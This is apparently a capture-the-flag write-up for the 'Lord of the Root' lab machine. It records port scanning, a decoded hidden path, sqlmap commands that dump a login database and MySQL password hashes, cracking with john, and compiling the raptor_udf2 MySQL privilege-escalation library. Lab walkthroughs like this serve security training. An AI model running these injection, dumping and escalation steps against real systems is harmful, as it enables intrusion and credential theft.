# LORD OF THE ROOT

## BASIC INFO
```
export IP=10.10.52.33

open port:
	22 OpenSSH 6.6.1p1
	1337 http
```

Navigating on the page (port 1337), found base64 string on any 404 page.
`THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh`
After decoding it becomes `Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!`\
Finally `/978345210/index.php`

Using sqlmap on the index.php we got above.
`sqlmap -o -u http://10.10.52.33:1337//978345210/index.php --forms --dbs` found that password is injectable.

So enumerating Webapps database got us the username and password for the web app.
```
username:	frodo
password:	iwilltakethring
```

let's try the other database. mysql database
`sqlmap -o -u http://10.10.52.33:1337/978345210/index.php --forms -D mysql -T user -C User,Password --dump`

Now we got the user root with it's password hash.\
Crack the hash with john.\
```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

root: darkshadow
```

gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc